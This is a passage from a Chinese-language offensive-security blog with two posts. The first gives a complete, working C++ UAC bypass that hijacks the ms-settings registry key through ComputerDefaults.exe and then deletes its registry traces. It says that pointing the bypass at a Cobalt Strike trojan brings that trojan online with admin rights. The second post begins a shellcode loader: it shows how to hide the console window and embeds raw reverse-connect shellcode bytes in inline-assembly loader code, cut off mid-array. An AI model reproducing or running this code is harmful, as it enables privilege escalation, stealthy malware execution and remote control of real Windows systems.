class="line">C:\Windows\System32\dcomcnfg.exe</span><br><span class="line">C:\Windows\System32\DeviceEject.exe</span><br><span class="line">C:\Windows\System32\DeviceProperties.exe</span><br><span class="line">C:\Windows\System32\djoin.exe</span><br><span class="line">C:\Windows\System32\easinvoker.exe</span><br><span class="line">C:\Windows\System32\EASPolicyManagerBrokerHost.exe</span><br><span class="line">C:\Windows\System32\eudcedit.exe</span><br><span class="line">C:\Windows\System32\eventvwr.exe</span><br><span class="line">C:\Windows\System32\fodhelper.exe</span><br><span class="line">C:\Windows\System32\fsquirt.exe</span><br><span class="line">C:\Windows\System32\FXSUNATD.exe</span><br><span class="line">C:\Windows\System32\immersivetpmvscmgrsvr.exe</span><br><span class="line">C:\Windows\System32\iscsicli.exe</span><br><span class="line">C:\Windows\System32\iscsicpl.exe</span><br><span class="line">C:\Windows\System32\lpksetup.exe</span><br><span class="line">C:\Windows\System32\MSchedExe.exe</span><br><span class="line">C:\Windows\System32\msconfig.exe</span><br><span class="line">C:\Windows\System32\msra.exe</span><br><span class="line">C:\Windows\System32\MultiDigiMon.exe</span><br><span class="line">C:\Windows\System32\newdev.exe</span><br><span class="line">C:\Windows\System32\odbcad32.exe</span><br><span class="line">C:\Windows\System32\PasswordOnWakeSettingFlyout.exe</span><br><span class="line">C:\Windows\System32\recdisc.exe</span><br><span class="line">C:\Windows\System32\rrinstaller.exe</span><br><span class="line">C:\Windows\System32\shrpubw.exe</span><br><span class="line">C:\Windows\System32\slui.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesAdvanced.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesComputerName.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesDataExecutionPrevention.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesHardware.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesPerformance.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesProtection.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesRemote.exe</span><br><span class="line">C:\Windows\System32\SystemSettingsAdminFlows.exe</span><br><span class="line">C:\Windows\System32\SystemSettingsRemoveDevice.exe</span><br><span class="line">C:\Windows\System32\Taskmgr.exe</span><br><span class="line">C:\Windows\System32\tcmsetup.exe</span><br><span class="line">C:\Windows\System32\TpmInit.exe</span><br><span class="line">C:\Windows\System32\WindowsUpdateElevatedInstaller.exe</span><br><span class="line">C:\Windows\System32\WSReset.exe</span><br><span class="line">C:\Windows\System32\wusa.exe</span><br><span class="line">C:\Windows\System32\Sysprep\sysprep.exe</span><br></pre></td></tr></table></figure>



<p>这里还需注意一点，有个别程序会弹出uac框的，例如changepk.exe，这个程序在windows11不会弹uac，但是在windows10会弹uac</p>
<img src="uac白名单挖掘/image-20230623183142614.png" alt="image-20230623183142614" style="zoom:67%;" />	



<h3 id="2-调用Shell-Open-command键"><a href="#2-调用Shell-Open-command键" class="headerlink" title="2.调用Shell\Open\command键"></a>2.调用<code>Shell\Open\command</code>键</h3><p>打开ProcessMonitor捕捉ComputerDefaults.exe的运行信息，在Filter工具栏设置<code>Process Name</code>为<code>ComputerDefaults.exe</code>，<code>Result</code>设置为<code>NAME NOT FOUND</code></p>
<img src="uac白名单挖掘/image-20230622165530035.png" alt="image-20230622165530035" style="zoom:67%;" />	

<img src="uac白名单挖掘/image-20230622165809092.png" alt="image-20230622165809092" style="zoom:67%;" />	



<p>随后运行ComputerDeafaults，ProcessMonitor立马会显示关于此程序的相关信息</p>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165919733.png" alt="image-20230622165919733"></p>
<p>​			</p>
<p>注意此路径<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>, 这行的操作是<code>RegQueryKey</code>，表示查询注册表的一个键</p>
<blockquote>
<p>在注册表中，键相当于目录，它们可以包含其他键（相当于子目录）或键值（相当于文件）。一个键通常不直接包含数据，数据是存储在键值中的</p>
</blockquote>
<img src="uac白名单挖掘/image-20230622194233641.png" alt="image-20230622194233641" style="zoom:67%;" />	



<p>打开注册表，新建上述的键<code>ms-settings\Shell\Open\command</code></p>
<img src="uac白名单挖掘/image-20230622195409277.png" alt="image-20230622195409277" style="zoom:67%;" />	



<p>再用ProcessMonitor捕捉ComputerDefaults的信息，发现它还会去查询<code>DelegateExecute</code>键值，操作为<code>RegQueryValue</code>，表示查询注册表的键值</p>
<blockquote>
<p>在注册表中，键值是存储实际数据的地方，例如，可以在一个键值中存储一个字符串、一个数字或一个二进制数据</p>
</blockquote>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622200928739.png" alt="image-20230622200928739"></p>
<p>在注册表对应的键中添加个键值为<code>DelegateExecute</code>，并将此目录的默认键值设为<code>cmd.exe</code></p>
<blockquote>
<p>Windows注册表中，每个键下面都有一个被称为“默认”或“(默认)”的键值。你可以将其视为该键的默认数据。当你访问一个键而不指定键值的名称时，将返回此默认键值的数据</p>
</blockquote>
<img src="uac白名单挖掘/image-20230622201650750.png" alt="image-20230622201650750" style="zoom:67%;" />	



<p>再次运行ComputerDefaults，会弹出系统管理员权限的cmd，也就是说如果我们将cmd.exe替换成shellcode木马的路径，那么就能获得管理员权限的shell</p>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622202206176.png" alt="image-20230622202206176"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由此我们可以总结，在执行ComputerDefaults.exe程序之前，系统会首先检查注册表路径<code>HKCU:\Software\Classes\ms-settings\shell\open\command</code>是否存在。如果存在，系统将继续搜索同一目录下是否存在DelegateExecute键值对。</p>
<p>只有在这两个条件都满足的情况下，系统才会执行由<code>HKCU:\Software\Classes\ms-settings\shell\open\command</code>路径所指向的exe文件	</p>
<p>还有一点，为何要找HKCU(HKEY_CURRENT_USER)目录下的键值对呢？因为HKCU下的注册表键值不需要管理员权限。HKCU 包含当前登录用户配置信息，每个用户都有其自己的 HKCU，其中的设置可以被用户自由修改，通常不需要额外的管理员权限</p>
<h1 id="bypass的实现"><a href="#bypass的实现" class="headerlink" title="bypass的实现"></a>bypass的实现</h1><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="1-创建新键"><a href="#1-创建新键" class="headerlink" title="1.创建新键"></a>1.创建新键</h3><p>在 <code>HKEY_CURRENT_USER\Software\Classes</code> 注册表路径下创建一个名为 <code>ms-settings\shell\open\command</code> 的新键（如果该键已存在则打开它）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建或打开注册表键</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, subKey, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to create or open registry key\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="2-创建键值"><a href="#2-创建键值" class="headerlink" title="2.创建键值"></a>2.创建键值</h3><p>在刚刚创建的键下，创建一个名为 <code>DelegateExecute</code> 的键值，并将其设置为空字符串</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加 &quot;DelegateExecute&quot; 键值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, valueName, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)<span class="string">&quot;&quot;</span>, <span class="built_in">sizeof</span>(<span class="string">&quot;&quot;</span>)) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-设置键的默认键值"><a href="#3-设置键的默认键值" class="headerlink" title="3.设置键的默认键值"></a>3.设置键的默认键值</h3><p>设置 <code>ms-settings\shell\open\command</code> 键的默认键值为 <code>filename</code> 变量，这里是 <code>&quot;cmd.exe&quot;</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置默认键值为 &quot;calc.exe&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)filename, <span class="built_in">strlen</span>(filename) + <span class="number">1</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set default registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="4-启动进程"><a href="#4-启动进程" class="headerlink" title="4.启动进程"></a>4.启动进程</h3><p>使用 <code>CreateProcess</code> 函数启动新的进程来执行 <code>&quot;C://windows//system32//cmd.exe&quot;</code> 这个命令，命令参数是 <code>/c C://windows//system32//computerdefaults.exe</code>。当这个命令执行时，它实际上会通过 <code>ms-settings\shell\open\command</code> 注册表键执行 <code>cmd.exe</code>，因为此键的默认键值被设置为 <code>cmd.exe</code>。这个过程就是用户账户控制（UAC）的绕过</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFO si;  <span class="comment">//进程启动信息</span></span><br><span class="line">	PROCESS_INFORMATION pi;  <span class="comment">//进程信息</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(si));  <span class="comment">//将结构体si的所有成员都初始化为0</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in">sizeof</span>(pi));  <span class="comment">//将结构体pi的所有成员都初始化为0</span></span><br><span class="line">	si.cb = <span class="built_in">sizeof</span>(si);  <span class="comment">//结构体大小</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CreateProcess</span>(</span><br><span class="line">		<span class="string">&quot;C://windows//system32//cmd.exe&quot;</span>,  <span class="comment">//要执行的应用程序名称（包含路径）</span></span><br><span class="line">		(LPSTR)<span class="string">&quot;/c C://windows//system32//computerdefaults.exe&quot;</span>,  <span class="comment">//命令行参数</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//进程句柄不可被继承</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//线程句柄不可被继承</span></span><br><span class="line">		FALSE,  <span class="comment">//不继承句柄</span></span><br><span class="line">		<span class="number">0</span>,  <span class="comment">//标志位为0</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的环境变量</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的工作目录</span></span><br><span class="line">		&amp;si,  <span class="comment">//传递启动信息</span></span><br><span class="line">		&amp;pi)  <span class="comment">//传递进程信息</span></span><br><span class="line">		) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcess failed (%d).\n&quot;</span>, <span class="built_in">GetLastError</span>());  <span class="comment">//打印错误信息</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放进程句柄和线程句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br></pre></td></tr></table></figure>



<h3 id="5-清理痕迹"><a href="#5-清理痕迹" class="headerlink" title="5.清理痕迹"></a>5.清理痕迹</h3><p>为了清理痕迹，程序等待一段时间后删除 <code>HKEY_CURRENT_USER\Software\Classes\ms-settings</code> 键，删除所有刚刚创建的键和键值</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除整个ms-settings目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">RegDeleteTree</span>(HKEY_CURRENT_USER,<span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>) != ERROR_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;RegDeleteTree Error:%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BypassUac.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">BypassUac</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename)</span> </span>&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* subKey = <span class="string">&quot;Software\\Classes\\ms-settings\\shell\\open\\command&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* valueName = <span class="string">&quot;DelegateExecute&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建或打开注册表键</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, subKey, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to create or open registry key\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加 &quot;DelegateExecute&quot; 键值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, valueName, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)<span class="string">&quot;&quot;</span>, <span class="built_in">sizeof</span>(<span class="string">&quot;&quot;</span>)) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置默认键值为 &quot;calc.exe&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)filename, <span class="built_in">strlen</span>(filename) + <span class="number">1</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set default registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO si;  <span class="comment">//进程启动信息</span></span><br><span class="line">	PROCESS_INFORMATION pi;  <span class="comment">//进程信息</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(si));  <span class="comment">//将结构体si的所有成员都初始化为0</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in">sizeof</span>(pi));  <span class="comment">//将结构体pi的所有成员都初始化为0</span></span><br><span class="line">	si.cb = <span class="built_in">sizeof</span>(si);  <span class="comment">//结构体大小</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CreateProcess</span>(</span><br><span class="line">		<span class="string">&quot;C://windows//system32//cmd.exe&quot;</span>,  <span class="comment">//要执行的应用程序名称（包含路径）</span></span><br><span class="line">		(LPSTR)<span class="string">&quot;/c C://windows//system32//computerdefaults.exe&quot;</span>,  <span class="comment">//命令行参数</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//进程句柄不可被继承</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//线程句柄不可被继承</span></span><br><span class="line">		FALSE,  <span class="comment">//不继承句柄</span></span><br><span class="line">		<span class="number">0</span>,  <span class="comment">//标志位为0</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的环境变量</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的工作目录</span></span><br><span class="line">		&amp;si,  <span class="comment">//传递启动信息</span></span><br><span class="line">		&amp;pi)  <span class="comment">//传递进程信息</span></span><br><span class="line">		) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcess failed (%d).\n&quot;</span>, <span class="built_in">GetLastError</span>());  <span class="comment">//打印错误信息</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放进程句柄和线程句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//删除整个ms-settings目录</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">RegDeleteTree</span>(HKEY_CURRENT_USER,<span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>) != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;RegDeleteTree Error:%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* filename = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">	<span class="built_in">BypassUac</span>(filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>执行程序后返回一个管理员权限的cmd				</p>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/%E5%8A%A8%E7%94%BB.gif" alt="动画"></p>
<p>如果我们将cmd.exe替换成cs木马的地址，那么cs就会以管理员权限上线</p>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/%E5%8A%A8%E7%94%BB-16874925352742.gif" alt="动画"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
      <meta itemprop="name" content="Xiao Ni">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chensicha‘s blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/29/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>56k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>51 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="去除黑框"><a href="#去除黑框" class="headerlink" title="去除黑框"></a>去除黑框</h1><p>当我们运行Shellcode加载器时会出现如下图所示的黑框，可采用以下方法去除它</p>
<img src="shellcode加载器/image-20230612171819718.png" alt="image-20230612171819718" style="zoom:50%;" />	



<p>将子系统设置为<code>窗口 (/SUBSYSTEM:WINDOWS)</code></p>
<img src="shellcode加载器/image-20230612172009161.png" alt="image-20230612172009161" style="zoom:67%;" />	



<p>将函数入口点设置为<code>mainCRTStartup</code></p>
<img src="shellcode加载器/image-20230612172127151.png" alt="image-20230612172127151" style="zoom:67%;" />	



<h1 id="1-内联汇编加载"><a href="#1-内联汇编加载" class="headerlink" title="1.内联汇编加载"></a>1.内联汇编加载</h1><p>使用内联汇编只能加载32位程序的ShellCode，因为64位程序不支持写内联汇编</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) <span class="comment">//将data段的内存设置成可读可写可执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ShellCode部分</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x07\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x8b\x48\x18\x8b\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1\xcf\x07\xac\x01\xc7\x38&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line"><span class="string">&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x68\xd2\x53\x6e\xfc\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29&quot;</span></span><br><span class="line"><span class="string">&quot;\xc4\x54\x50\x68\x9c\x13\x41\xc4\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x2c\x9b\xfc\xa4\x50\x58\xff\xd5\x97\x6a\x10\x56\x57\x68\xb6\x59\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x0e\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\xe8\xd9\xce\x36\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68&quot;</span></span><br><span class="line"><span 